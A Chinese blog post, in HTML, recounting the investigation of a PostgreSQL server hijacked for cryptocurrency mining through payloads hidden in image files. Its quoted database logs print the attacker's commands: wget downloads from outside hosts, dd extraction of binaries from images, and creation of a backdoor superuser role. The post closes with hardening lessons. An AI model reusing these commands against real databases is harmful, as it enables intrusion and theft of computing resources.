<!DOCTYPE html>
<html>
    <head>
    <!-- Title -->
    
    <title>
        记一次 postgresql 斯嘉丽约翰逊攻击的排查 | LexusLee&#39;s Blog
    </title>
    
    <!-- Favicons -->
    <link rel="icon shortcut" type="image/ico" href="/img/favicon.png">
    <link rel="icon" sizes="192x192" href="/img/favicon.png">
    <link rel="apple-touch-icon" href="/img/favicon.png">
    
    <!-- Meta & INfo -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#0097A7">
    <meta name="author" content="LexusLee">
    <meta name="description" content="Be the change you want to see in the world.">
    <meta name="keywords" content="Lexus">
    
    <!--iOS -->
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-title" content="Title">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="HandheldFriendly" content="True">
    <meta name="MobileOptimized" content="480">
    
    <!-- Add to homescreen for Chrome on Android -->
    <meta name="mobile-web-app-capable" content="yes">
    
    <!-- Add to homescreen for Safari on iOS -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="LexusLee&#39;s Blog">
    
    <!-- The Open Graph protocol -->
    <meta property="og:url" content="http://lexuslee.me">
    <meta property="og:type" content="blog">
    <meta property="og:title" content="记一次 postgresql 斯嘉丽约翰逊攻击的排查 | LexusLee&#39;s Blog">
    <meta property="og:description" content="Be the change you want to see in the world.">
    
     <!--[if lte IE 9]>
        <link rel="stylesheet" href="/css/ie-blocker.css">
        
        
            <script src="/js/ie-blocker.en.js"></script>
        
    <![endif]-->
    
    <!-- Import CSS -->
    <link rel="stylesheet" href="/css/material.min.css">
    <link rel="stylesheet" href="/css/style.min.css">
    <!-- Config CSS -->


<!-- Other Styles -->
<style>
	body, html{
		font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
	}
	
    a{
        color: #00838F
    }
    
    .mdl-card__media,
    #search-label,
    #search-form-label:after,
    #scheme-Paradox .hot_tags-count,
    #scheme-Paradox .sidebar_archives-count,
    #scheme-Paradox .sidebar-colored .sidebar-header,
    #scheme-Paradox .sidebar-colored .sidebar-badge{
        background-color: #0097A7 !important
    }
    
	/* Sidebar User Drop Down Menu Text Color */
	#scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
    #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus{
        color: #0097A7 !important
    }
    
    #post_entry-right-info,
    .sidebar-colored .sidebar-nav li:hover > a,
    .sidebar-colored .sidebar-nav li:hover > a i,
    .sidebar-colored .sidebar-nav li > a:hover,
    .sidebar-colored .sidebar-nav li > a:hover i,
    .sidebar-colored .sidebar-nav li > a:focus i,
    .sidebar-colored .sidebar-nav > .open > a,
    .sidebar-colored .sidebar-nav > .open > a:hover,
    .sidebar-colored .sidebar-nav > .open > a:focus,
    #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a{
        color: #0097A7 !important
    }
    
    .toTop{
        background: #757575 !important
    }
		
	.material-layout .material-post>.material-nav,
	.material-layout .material-index>.material-nav,
	.material-nav a{
		color: #757575;
	}
		
	#scheme-Paradox .MD-burger-layer {
		background-color: #757575;
	}

	#scheme-Paradox #post-toc-trigger-btn{
		color: #757575;
	}
	
	.post-toc a:hover{
		color: #00838F;
		text-decoration: underline;
	}
</style>


<!-- Theme Background Related-->

	<style>
		body{
            background-image: url(https://api.i-meto.com/bing?null);
        }
	</style>




<!-- Fade Effect -->

    <style>
        .fade {
            transition: all 800ms linear;
            -webkit-transform: translate3d(0,0,0);
            -moz-transform: translate3d(0,0,0);
            -ms-transform: translate3d(0,0,0);
            -o-transform: translate3d(0,0,0);
            transform: translate3d(0,0,0);
            opacity: 1;
        }

        .fade.out{
            opacity: 0;
        }
    </style>

	<script src="/js/jquery.min.js"></script>
	
	<link rel="stylesheet" href="/css/highlight/solarized-white.css">
	
	<!-- UC Browser Compatible-->
	<script>
		var agent = navigator.userAgent.toLowerCase();
		if(agent.indexOf('ucbrowser')>0) {
			document.write('<link rel="stylesheet" href="/css/uc.css">');
		   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
		}
	</script>
    
    <!-- Custom Head -->
    
</head>
	
	

    <body id="scheme-Paradox">

		
        <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
				
			
			
            <!-- Main Container -->
            <main class="material-layout__content" id="main">
				
                <!-- Top Anchor -->
                <div id="top"></div>
				
				
                <!-- Hamburger Button -->
                <button class="MD-burger-icon sidebar-toggle">
                    <span class="MD-burger-layer"></span>
                </button>
				
				
                
	<!-- Back Button -->
<!--
	<div class="material-back" id="backhome-div" tabindex="0">
		<a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" href="#" onclick="window.history.back();return false;" target="_self" role="button" data-upgraded=",MaterialButton,MaterialRipple">
			<i class="material-icons" role="presentation">arrow_back</i>
			<span class="mdl-button__ripple-container">
				<span class="mdl-ripple"></span>
			</span>
		</a>
	</div>			
-->
	<!-- Left aligned menu below button -->
	<button id="post-toc-trigger-btn"
			class="mdl-button mdl-js-button mdl-button--icon">
	  <i class="material-icons">format_list_numbered</i>
	</button>

	<ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect"
		for="post-toc-trigger-btn">
			
			<ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#背景"><span class="post-toc-number">1.</span> <span class="post-toc-text">背景</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#排查"><span class="post-toc-number">2.</span> <span class="post-toc-text">排查</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#反思"><span class="post-toc-number">3.</span> <span class="post-toc-text">反思</span></a></li></ol>
		
<!--			<li class="mdl-menu__item">Some Action</li>-->
	</ul>


<!-- Layouts -->

    <!-- Post Module -->
    <div class="material-post_container">
		
        <div class="material-post mdl-grid">
            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">

                <!-- Post Header(Thumbnail & Title) -->
                
	<!-- Paradox Post Header -->
	
		<!-- Custom Thumbnail -->
		<div class="post_thumbnail-custom mdl-card__media mdl-color-text--grey-50" style="background-image:url(http://image.knowing.asia/53d15464-67d2-4225-b98e-91bbdd132af7/72d33b84950ef1a25d3a74f60ab83873.png)">
	
        <p class="article-headline-p">
            记一次 postgresql 斯嘉丽约翰逊攻击的排查
        </p>
    </div>

	

				
				
					<!-- Paradox Post Info -->
					<div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
    
    <!-- Author Avatar -->
    <div id="author-avatar">
        <img src="/img/avatar.jpg" width="44px" height="44px" alt="Author Avatar"/>
    </div>
    <!-- Author Name & Date -->
    <div>
        <strong>LexusLee</strong>
        <span>Aug 11, 2018</span>
    </div>
    
    <div class="section-spacer"></div>
	
    <!-- Favorite -->
<!--
    <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
        <i class="material-icons" role="presentation">favorite</i>
        <span class="visuallyhidden">favorites</span>
    </button>
-->
    
    <!-- Tags (bookmark) -->
    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
        <i class="material-icons" role="presentation">bookmark</i>
        <span class="visuallyhidden">bookmark</span>
    </button>
    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
        <li class="mdl-menu__item">
        <a class="post_tag-link" href="/tags/Linux/">Linux</a>
    </ul>
    
    <!-- Share -->
    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
    <i class="material-icons" role="presentation">share</i>
    <span class="visuallyhidden">share</span>
</button>
<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
    
    
    
    
    
    <!-- Share Twitter -->
    <a class="post_share-link" href="https://twitter.com/intent/tweet?text=记一次 postgresql 斯嘉丽约翰逊攻击的排查&url=http://lexuslee.me//2018/08/11/2018-08-11-scarlett-johansson-sql-attack/index.html&via=LexusLee" target="_blank">
        <li class="mdl-menu__item">
            Share to Twitter
        </li>
    </a>
    
    <!-- Share Google+ -->
    <a class="post_share-link" href="https://plus.google.com/share?url=http://lexuslee.me//2018/08/11/2018-08-11-scarlett-johansson-sql-attack/index.html" target="_blank">
        <li class="mdl-menu__item">
            Share to Google+
        </li>
    </a>
    
    <!-- Share Weibo -->
    <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=记一次 postgresql 斯嘉丽约翰逊攻击的排查&url=http://lexuslee.me//2018/08/11/2018-08-11-scarlett-johansson-sql-attack/index.html&pic=&searchPic=false&style=simple" target="_blank">
        <li class="mdl-menu__item">
            Share to Weibo
        </li>
    </a>
</ul>
</div>
				

                <!-- Post Content -->
                <div id="post-content" class="markdown-Github mdl-color-text--grey-700 mdl-card__supporting-text fade out">
	
		<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>今天下午连续收到了腾讯云 CPU overload 报警</p>
<p><img src="http://7xse6j.com1.z0.glb.clouddn.com/CPU%20Overload.png" alt="CPU Usage"></p>
<p>登服务器一看, 有个 postgres 账户跑的进程把 CPU 占满了，进程名特别奇怪。</p>
<p><img src="http://7xse6j.com1.z0.glb.clouddn.com/htopinfo.png" alt="Htop info"></p>
<a id="more"></a>
<h3 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h3><p>于是根据 pid 到 <code>/proc/20619/stack</code> 下看到有一长串的 <code>[&lt;ffffffff81841ff2&gt;] entry_SYSCALL_64_fastpath+0x16/0x71</code> ，似乎短时间里发起大量的系统调用(prepare)并且还在不断增长。</p>
<p>接着 <code>cat /proc/20619/cmdline</code> 发现执行的是 <code>/var/lib/postgresql/9.5/main/Ac2p018-0</code> 这个坏家伙，查看发现这是个二进制文件，看不出问题，猜测和 postgresql 数据库有关，看起来不像是什么数据库维护脚本，第一反应是被数据库攻击了，于是查看 <code>/var/lib/postgresql/.bash_history</code> 和 <code>/var/lib/postgresql/.psql_history</code> 发现一条记录都没，显然是被手动清空了，更加确定是被 hack 了。担心已经被拿到 root 权限了，于是通过 <code>lastlog</code> 和 <code>last</code> 查看登录状态，所幸之前的 root 账户的 ip 都是我自己的，只有 postgres 这个账户看起来异常。</p>
<p>接着到 <code>/var/lib/postgresql/9.5/main/pg_log</code> 下查看数据库日志，抓到了几个奇怪的地方：</p>
<ol>
<li>有一个长连接持续从 <code>http://aluka.info/x6</code> 下载文件，</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div></pre></td><td class="code"><pre><div class="line">5144 --2018-08-11 15:47:30--  http://aluka.info/x6</div><div class="line">5145 Resolving aluka.info (aluka.info)... 103.27.110.206</div><div class="line">5146 Connecting to aluka.info (aluka.info)|103.27.110.206|:80... connected.</div><div class="line">5147 HTTP request sent, awaiting response... 200 OK</div><div class="line">5148 Length: 2758655 (2.6M)</div><div class="line">5149 Saving to: ‘xmm’</div><div class="line">5150</div><div class="line">5151      0K .......... .......... .......... .......... ..........  1%  399K 7s</div><div class="line">5152     50K .......... .......... .......... .......... ..........  3%  601K 5s</div><div class="line">5153    100K .......... .......... .......... .......... ..........  5%  592K 5s</div><div class="line">5154    150K .......... .......... .......... .......... ..........  7% 1.69M 4s</div><div class="line">5155    200K .......... .......... .......... .......... ..........  9%  754K 4s</div><div class="line">5156    250K .......... .......... .......... .......... .......... 11%  422K 4s</div><div class="line">5157    300K .......... .......... .......... .......... .......... 12%  405K 4s</div><div class="line">5158    350K .......... .......... .......... .......... .......... 14%  179K 5s</div><div class="line">5159    400K .......... .......... .......... .......... .......... 16% 81.1K 8s</div><div class="line">5160    450K .......... .......... .......... .......... .......... 18% 35.1K 13s</div><div class="line">5161    500K .......... .......... .......... .......... .......... 20%  117K 13s</div><div class="line">5162    550K .......... .......... .......... .......... .......... 22% 86.3K 14s</div><div class="line">5163    600K .......... .......... .......... .......... .......... 24%  122K 14s</div><div class="line">5164    650K .......... .......... .......... .......... .......... 25%  169K 13s</div><div class="line">5165    700K .......... .......... .......... .......... .......... 27%  171K 13s</div><div class="line">5166    750K .......... .......... .......... .......... .......... 29% 93.8K 13s</div><div class="line">5167    800K .......... .......... .......... .......... .......... 31% 94.9K 13s</div><div class="line">5168    850K .......... .......... .......... .......... .......... 33%  101K 13s</div><div class="line">5169    900K .......... .......... .......... .......... .......... 35% 53.6K 14s</div><div class="line">5170    950K .......... .......... .......... .......... .......... 37% 94.3K 14s</div><div class="line">5171   1000K .......... .......... .......... .......... .......... 38% 77.0K 13s</div><div class="line">5172   1050K .......... .......... .......... .......... .......... 40% 73.6K 13s</div><div class="line">5173   1100K .......... .......... .......... .......... .......... 42% 97.2K 13s</div><div class="line">5174   1150K .......... .......... .......... .......... .......... 44%  130K 13s</div><div class="line">5175   1200K .......... .......... .......... .......... .......... 46%  194K 12s</div><div class="line">5176   1250K .......... .......... .......... .......... .......... 48%  173K 12s</div><div class="line">5177   1300K .......... .......... .......... .......... .......... 50%  109K 11s</div><div class="line">5178   1350K .......... .......... .......... .......... .......... 51% 82.9K 11s</div><div class="line">5179   1400K .......... .......... .......... .......... .......... 53%  134K 10s</div><div class="line">5180   1450K .......... .......... .......... .......... .......... 55%  106K 10s</div><div class="line">5181   1500K .......... .......... .......... .......... .......... 57%  188K 10s</div><div class="line">5182   1550K .......... .......... .......... .......... .......... 59% 51.4K 9s</div><div class="line">5183   1600K .......... .......... .......... .......... .......... 61% 54.6K 9s</div><div class="line">5184   1650K .......... .......... .......... .......... .......... 63% 86.8K 9s</div><div class="line">5185   1700K .......... .......... .......... .......... .......... 64%  160K 8s</div><div class="line">5186   1750K .......... .......... .......... .......... .......... 66% 97.9K 8s</div><div class="line">5187   1800K .......... .......... .......... .......... .......... 68%  153K 8s</div><div class="line">5188   1850K .......... .......... .......... .......... .......... 70%  127K 7s</div><div class="line">5189   1900K .......... .......... .......... .......... .......... 72%  117K 7s</div><div class="line">5190   1950K .......... .......... .......... .......... .......... 74% 63.8K 6s</div><div class="line">5191   2000K .......... .......... .......... .......... .......... 76%  119K 6s</div><div class="line">5192   2050K .......... .......... .......... .......... .......... 77% 67.1K 5s</div><div class="line">5193   2100K .......... .......... .......... .......... .......... 79% 98.0K 5s</div><div class="line">5194   2150K .......... .......... .......... .......... .......... 81%  127K 5s</div><div class="line">5195   2200K .......... .......... .......... .......... .......... 83%  105K 4s</div><div class="line">5196   2250K .......... .......... .......... .......... .......... 85% 99.6K 4s</div><div class="line">5197   2300K .......... .......... .......... .......... .......... 87% 76.9K 3s</div><div class="line">5198   2350K .......... .......... .......... .......... .......... 89%  162K 3s</div><div class="line">5199   2400K .......... .......... .......... .......... .......... 90%  153K 2s</div><div class="line">5200   2450K .......... .......... .......... .......... .......... 92%  239K 2s</div><div class="line">5201   2500K .......... .......... .......... .......... .......... 94%  160K 1s</div><div class="line">5202   2550K .......... .......... .......... .......... .......... 96%  191K 1s</div><div class="line">5203   2600K .......... .......... .......... .......... .......... 98%  118K 0s</div><div class="line">5204   2650K .......... .......... .......... .......... ...       100% 82.4K=24s</div><div class="line">5205</div><div class="line">5206 2018-08-11 15:47:54 (111 KB/s) - ‘xmm’ saved [2758655/2758655]</div><div class="line">5207</div></pre></td></tr></table></figure>
<ol>
<li>发现更早的日志里，有两个连接从 <code>img1.imagehousing.com</code> 下载了两张图片, 并成功设置了 777 权限</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">23 Resolving img1.imagehousing.com (img1.imagehousing.com)... 104.27.180.36, 104.27.181.36, 2400:cb00:2048:1::681b:b524, ...</div><div class="line">24 Connecting to img1.imagehousing.com (img1.imagehousing.com)|104.27.180.36|:80... connected.</div><div class="line">25 HTTP request sent, awaiting response... 200 OK</div><div class="line">26 Length: 1571 (1.5K) [image/png]</div><div class="line">27 Saving to: ‘./conf1.dat’</div><div class="line">28</div><div class="line">29      0K .                                                     100%  368M=0s</div><div class="line">30</div><div class="line">31 2018-08-05 12:54:26 (368 MB/s) - ‘./conf1.dat’ saved [1571/1571]</div><div class="line">32</div><div class="line">33 896+0 records in</div><div class="line">34 896+0 records out</div><div class="line">35 896 bytes copied, 0.000933778 s, 960 kB/s</div><div class="line">36 chmod: cannot access &apos;./x4064410502&apos;: No such file or directory</div><div class="line">37 2018-08-05 12:54:26 CST [24806-14] pgsql@postgres LOG:  duration: 810.107 ms  statement: select fun6404402637 (&apos;wget  -c  http://img1.imagehousing.com/0/baby-942650.png -O ./conf1.dat;dd  skip=675  bs=1  if=./conf1.dat  of=config.json  ;rm -f ./conf1#</div><div class="line">38 --2018-08-05 12:54:27--  http://img1.imagehousing.com/0/cat-497532.png</div><div class="line">39 Resolving img1.imagehousing.com (img1.imagehousing.com)... 104.27.180.36, 104.27.181.36, 2400:cb00:2048:1::681b:b424, ...</div><div class="line">40 Connecting to img1.imagehousing.com (img1.imagehousing.com)|104.27.180.36|:80... connected.</div><div class="line">41 HTTP request sent, awaiting response... 200 OK</div><div class="line">42 Length: 840464 (821K) [image/png]</div><div class="line">43 Saving to: ‘ifzsvasg.jpg’</div><div class="line">44</div><div class="line">45      0K .......... .......... .......... .......... ..........  6% 81.3K 9s</div><div class="line">46     50K .......... .......... .......... .......... .......... 12%  153K 7s</div><div class="line">47    100K .......... .......... .......... .......... .......... 18% 86.2K 7s</div><div class="line">48    150K .......... .......... .......... .......... .......... 24%  635K 5s</div><div class="line">49    200K .......... .......... .......... .......... .......... 30%  138K 4s</div><div class="line">50    250K .......... .......... .......... .......... .......... 36%  139K 4s</div><div class="line">51    300K .......... .......... .......... .......... .......... 42%  146K 4s</div><div class="line">52    350K .......... .......... .......... .......... .......... 48%  176K 3s</div><div class="line">53    400K .......... .......... .......... .......... .......... 54%  194K 3s</div><div class="line">54    450K .......... .......... .......... .......... .......... 60%  189K 2s</div><div class="line">55    500K .......... .......... .......... .......... .......... 67%  179K 2s</div><div class="line">56    550K .......... .......... .......... .......... .......... 73%  178K 1s</div><div class="line">57    600K .......... .......... .......... .......... .......... 79%  187K 1s</div><div class="line">58    650K .......... .......... .......... .......... .......... 85%  191K 1s</div><div class="line">59    700K .......... .......... .......... .......... .......... 91%  132K 0s</div><div class="line">60    750K .......... .......... .......... .......... .......... 97%  202K 0s</div><div class="line">61    800K .......... ..........                                 100%  141K=5.3s</div><div class="line">62</div><div class="line">63 2018-08-05 12:54:33 (154 KB/s) - ‘ifzsvasg.jpg’ saved [840464/840464]</div><div class="line">...</div></pre></td></tr></table></figure>
<p>不禁很好奇是怎么做到的，但是又不敢把这两张图片 scp 到本地，于是起了个静态文件 serve 看了下这两张图片表面上看起来竟然是斯嘉丽约翰逊的大头照(流口水!)</p>
<p><img src="http://www.4hou.com/uploads/20180318/1521342249300199.png" alt="Scalet Jown"></p>
<p>印象里面 jpg/jpeg 图片似乎有种隐写 payload 的方法，早年作为葫芦娃种子来传播，网上查到 metaspolit 的这个<a href="https://github.com/r00t-3xp10it/FakeImageExploiter" target="_blank" rel="external">组件</a>似乎可以实现。同时也找到了这个工具 <a href="https://github.com/abeluck/stegdetect" target="_blank" rel="external">strgdetext</a> 用来提取图片中的隐写数据，可惜提取出来后仍是一段看不懂二进制码，于是思路阻塞住了。</p>
<p>想到既然需要提取 payload, 那么数据库日志里肯定也有相应代码来做这一步，于是重新翻了下日志，果不其然，发现了真正攻击的这一步在这儿</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">68 2018-08-05 12:54:34 CST [24806-15] pgsql@postgres LOG:  duration: 6705.657 ms  statement: select fun6404402637(&apos;wget  -c   http://img1.imagehousing.com/0/cat-497532.png -O ifzsvasg.jpg;dd  skip=20656  bs=1  if=./ifzsvasg.jpg  of=x4064410502;rm -f ./i#</div><div class="line">69 2018-08-05 12:54:34 CST [24845-1] postgres@postgres FATAL:  password authentication failed for user &quot;postgres&quot;</div><div class="line">70 2018-08-05 12:54:34 CST [24845-2] postgres@postgres DETAIL:  Connection matched pg_hba.conf line 101: &quot;host    all             all              0.0.0.0/0              md5&quot;</div><div class="line">71 2018-08-05 12:54:35 CST [24806-16] pgsql@postgres ERROR:  role &quot;login&quot; already exists</div><div class="line">72 2018-08-05 12:54:35 CST [24806-17] pgsql@postgres STATEMENT:  CREATE ROLE   LOGIN ENCRYPTED PASSWORD &apos;md51351dbb7fe95c1f277282bc842cb3d6b&apos; SUPERUSER CREATEDB CREATEROLE REPLICATION   VALID UNTIL &apos;infinity&apos;;</div><div class="line">73 2018-08-05 12:54:36 CST [24806-18] pgsql@postgres ERROR:  role &quot;login&quot; already exists</div><div class="line">74 2018-08-05 12:54:36 CST [24806-19] pgsql@postgres STATEMENT:  CREATE ROLE   LOGIN ENCRYPTED PASSWORD &apos;md51351dbb7fe95c1f277282bc842cb3d6b&apos; SUPERUSER CREATEDB CREATEROLE    VALID UNTIL &apos;infinity&apos;;</div><div class="line">75 2018-08-05 12:54:36 CST [24806-21] pgsql@postgres STATEMENT:  CREATE ROLE pgsql LOGIN ENCRYPTED PASSWORD &apos;md56413b16b3d0861a1d2538e8d5a5eb39c&apos;  SUPERUSER CREATEDB CREATEROLE    VALID UNTIL &apos;infinity&apos;;</div></pre></td></tr></table></figure>
<p>通过 <code>select tmp_function(cmd)</code> 的方式 执行了 下载图片 – 提取 paylod – 设置权限 – 删除图片 – 通过 payload 里的自定义代码重建了 pgsql 数据库账户 – 拿到数据库 root 权限 这一套组合拳，漂亮！</p>
<p>排查到问题之后，赶紧清空了相关文件和 dbuser，设置了 postgres superuser 本地连接的设置，禁掉了 superuser 网络连接, 翻了下斯嘉丽约翰逊的其他照片，终于长舒一口气。</p>
<p>回想起来，看看是否有其他人也遇到了「斯嘉丽攻击」, 一查发现果然果然不只我一人中招，不过看了下 <a href="https://www.exploit-db.com/" target="_blank" rel="external">exploit db</a> 里还没记录这个漏洞，对比了下时间，似乎是18年初才兴起的。</p>
<ul>
<li><a href="https://xz.aliyun.com/t/2158" target="_blank" rel="external">通过Scarlett Johansson的照片令Postgre数据库开启门罗币挖矿之旅</a></li>
<li><a href="http://www.btc112.com/Monero/21066.html" target="_blank" rel="external">斯嘉丽门罗币攻击</a></li>
</ul>
<h3 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h3><p>这次主要的原因是 postgres 配置权限时偷懒导致服务器变成挖矿僵尸。</p>
<ol>
<li>postgres <code>pg_hba.conf</code> 里的用户认证 method 应改成 md5 方式</li>
<li>数据库 superuser 只配置只能 local 访问禁止远程访问</li>
<li>腾讯云安全组里数据库端口 outbound 应尽量限制 ip 段</li>
</ol>

	
	
	
	
</div>
				
				

                <!-- Post Comments -->
                


    <!-- 使用 DISQUS -->
	<div id="disqus-comment">
		<div id="disqus_thread"></div>
<script>
	var disqus_config = function () {
		this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
		this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
	};

	(function() { // DON'T EDIT BELOW THIS LINE
		var d = document, s = d.createElement('script');
		s.src = '//thehackercat.disqus.com/embed.js';
		s.setAttribute('data-timestamp', +new Date());
		(d.head || d.body).appendChild(s);
	})();
</script>
	</div>
	<style>
		#disqus-comment{
			background-color:#eee;
			padding:2pc;
		}
	</style>

            </div>

            <!-- Post Prev & Next Nav -->
            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
    
    <!-- Prev Nav -->
    
        <a href="/2018/09/14/2018-09-14-k8s service&endpoint/" id="post_nav-newer" class="prev-content">
            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                <i class="material-icons">arrow_back</i>
            </button>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            Newer
        </a>
    

    <!-- Section Spacer -->
    <div class="section-spacer"></div>

    <!-- Next Nav -->
    
        <a href="/2018/02/01/2018-01-18-Service-fallback/" id="post_nav-older" class="next-content">
            Older
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
                <i class="material-icons">arrow_forward</i>
            </button>
        </a>
    
</nav>
        </div>
    </div>

				
				
					<!-- Overlay For Active Sidebar -->
<div class="sidebar-overlay "></div>

<!-- Material sidebar -->
<aside id="sidebar" class="sidebar sidebar-colored  sidebar-fixed-left" role="navigation">
	<div id="sidebar-main">
	    <!-- Sidebar Header -->
		<div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
    <!-- Top bar -->
    <div class="top-bar"></div>

    <!-- Sidebar toggle button -->
    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
    <i class="material-icons">clear_all</i>
    <span class="mdl-button__ripple-container"><span class="mdl-ripple"></span></span></button>

    <!-- Sidebar Avatar -->
    <div class="sidebar-image">
        <img src="/img/avatar.jpg" alt="LexusLee's avatar">
    </div>

    <!-- Sidebar Email -->
    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
        lexuscyborg103@email.com
        <b class="caret"></b>
    </a>
</div>

		<!-- Sidebar Navigation  -->
		<ul class="nav sidebar-nav">
    <!-- User dropdown  -->
    <li class="dropdown">
        <ul id="settings-dropdown" class="dropdown-menu">
			
                <li>
                    <a href="mailto:lexuscyborg103@gmail.com" target="_blank" title="Email Me">
						<i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
                        Email Me
                    </a>
                </li>
            
        </ul>
    </li>

    <!-- Homepage -->
    <li id="sidebar-first-li">
        <a href="/" target="_self">
            <i class="material-icons sidebar-material-icons">home</i>
             Home
        </a>
    </li>

    <!-- I'm Feeling Lucky -->
<!--
    <li class="dropdown">
        <a href="" target="_self">
            <i class="material-icons sidebar-material-icons">explore</i>
             sidebar.imlucky
        </a>
    </li>
-->

	
    <!-- Archives  -->
    <li class="dropdown">
        <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
            <i class="material-icons sidebar-material-icons">inbox</i>
             Archives
            <b class="caret"></b>
        </a>
        <ul class="dropdown-menu">
            <li>
            <a class="sidebar_archives-link" href="/archives/2019/08/">August 2019<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/07/">July 2019<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/09/">September 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/08/">August 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/02/">February 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">December 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/09/">September 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/08/">August 2017<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" 